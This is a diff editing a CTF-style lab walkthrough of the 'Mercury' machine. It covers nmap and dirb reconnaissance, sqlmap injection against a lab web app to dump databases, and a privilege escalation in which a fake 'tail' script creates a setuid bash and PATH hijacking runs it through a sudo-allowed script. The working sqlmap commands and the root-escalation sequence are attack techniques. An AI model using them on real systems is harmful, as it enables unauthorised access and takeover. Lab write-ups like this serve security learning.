@@ -282,7 +282,12 @@ Netdiscover for Kali – Passive network discovery
 
 
 
-Key Findings : 
+Using ‘dirb’ and ‘Nmap’. It is confirmed that there is ‘robots.txt’ but disallows entry.
+
+
+
+
+**Key Findings **
 
 
 
@@ -298,8 +303,7 @@ Open Ports :
 -	8080 http (WSGI Server 0.2 – Python 3.8.2)
 
 
-Educational Insight:
-Reconnaissance is the first step in the Cyber Kill Chain. Passive tools like Netdiscover help identify live hosts, while active scanners like Nmap reveal services and potential attack vectors.
+
 
 
 
@@ -313,7 +317,7 @@ Objective: Identify vulnerable web components and prepare for exploitation.
 
 
 
-Using ‘dirb’ and ‘Nmap’. It is confirmed that there is ‘robots.txt’ but disallows entry.
+
 While trying the common different url paths. I noticed something : 
 
 
@@ -340,8 +344,8 @@ Website Todo List – Reveals insecure DB access via raw SQL queries
 
 
 
-Educational Insight : 
-Use models in Django instead of direct MySQL call → They’re currently calling the DB directly. This opens the door to SQL injection.
+
+The machine use models in Django instead of direct MySQL call → They’re currently calling the DB directly. This opens the door to SQL injection.
 
 
 
@@ -356,9 +360,17 @@ SQL Injection via SQLMap in Kali Linux :
 ```sqlmap -u "http://192.168.1.201:8080/mercuryfacts/”  --batch --risk=3 --level=5```
 
 Flags explained:
+
+
 •	-u → target URL
+
+
 •	--batch → auto-confirm prompts
+
+
 •	--risk=3 → test risky payloads
+
+
 •	--level=5 → test more parameters and headers
 
 
@@ -380,8 +392,8 @@ This lists all available databases.:
 
 
 
-Discovered databases:
-•	information_schema
+Discovered databases:<br>
+•	information_schema<br>
 •	mercury
 
 
@@ -402,11 +414,12 @@ We’ll check the ‘information_schema’ first :
 
 
 
-<img width="1060" height="1106" alt="image" src="https://github.com/user-attachments/assets/097614ae-49ef-4b7d-8121-f4cc261a030c" />
+<img width="1125" height="939" alt="image" src="https://github.com/user-attachments/assets/521cc28b-8e5a-413e-97a4-648f87d222fc" />
 
 
 
-Didn’t see anything that is helpful to our case. Lets try the other database :
+
+Didn’t see anything that is helpful to our case. Lets try the other database :<br>
 ```sqlmap -u "http://192.168.1.201:8080/mercuryfacts/#1*/" -D mercury –tables```
 
 
@@ -434,7 +447,7 @@ Login the ‘webmaster’ first since it is an obvious administrator account by 
 <img width="1125" height="756" alt="image" src="https://github.com/user-attachments/assets/771f2295-b8bc-4501-8507-0df88c513cf2" />
 
 
-Check directory : ```ls```       Check the textfile : ```cat user_flag.txt```
+Check directory : ```ls```    <br>   Check the textfile : ```cat user_flag.txt```
 
 
 
@@ -548,11 +561,14 @@ Objective: Escalate privileges
 
 
 Create a Malicious Binary : 
+
 ```
-echo '#!/bin/bash' > /tmp/grep
-echo 'cp /bin/bash /tmp/rootbash' >> /tmp/grep
-echo 'chmod +s /tmp/rootbash' >> /tmp/grep
-chmod +x /tmp/grep
+echo '#!/bin/bash' > /tmp/tail
+echo 'cp /bin/bash /tmp/rootbash' >> /tmp/tail
+echo 'chmod +s /tmp/rootbash' >> /tmp/tail
+chmod +x /tmp/tail
+sudo PATH= /tmp:$PATH /usr/bin/check_syslog.sh
+/tmp/rootbash -p
 ```
 
 
